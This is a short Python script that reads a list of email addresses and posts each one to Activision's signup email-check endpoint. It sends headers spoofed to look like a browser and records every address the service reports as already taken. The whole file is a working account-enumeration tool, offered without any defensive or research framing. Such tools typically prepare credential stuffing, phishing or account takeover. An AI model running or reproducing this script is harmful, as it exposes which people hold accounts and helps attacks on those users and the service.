import requests
from colorama import Fore, init

init(autoreset=True)

with open('emails.txt', 'r', encoding='utf-8') as file:
    emails = file.read().splitlines()

url = 'https://s.activision.com/activision/signup/checkEmail'

headers = {
    'Accept': '*/*',
    'Accept-Language': 'fa,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'https://s.activision.com',
    'Referer': 'https://s.activision.com/activision/signup',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

for email in emails:
    data = {'email': email}

    response = requests.post(url, headers=headers, data=data)

    if 'fa.EMAIL_TAKEN' in response.text:
        print(f"{Fore.GREEN}Find Email !{Fore.RESET} - {email}")
        with open('found_emails.txt', 'a', encoding='utf-8') as found_file:
            found_file.write(email + '\n')
    else:
        print(f"{Fore.RED}Email not found - {email}")
